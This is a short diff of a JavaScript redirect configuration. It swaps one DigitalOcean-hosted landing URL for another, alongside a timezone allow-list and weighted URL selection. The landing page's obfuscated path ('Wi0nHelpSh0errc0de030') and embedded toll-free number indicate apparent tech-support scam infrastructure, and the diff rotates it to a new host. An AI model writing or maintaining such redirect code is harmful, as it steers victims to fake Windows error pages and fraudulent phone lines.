@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-etbbk.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-312-371", weight: 0.5 },
-    { url: "https://octopus-app-etbbk.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-312-371", weight: 0.5 } 
+    { url: "https://king-prawn-app-oy9fm.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-312-371", weight: 0.5 },
+    { url: "https://king-prawn-app-oy9fm.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-312-371", weight: 0.5 } 
 ];
 
 // --- Pre-Compilation Cache Layer ---
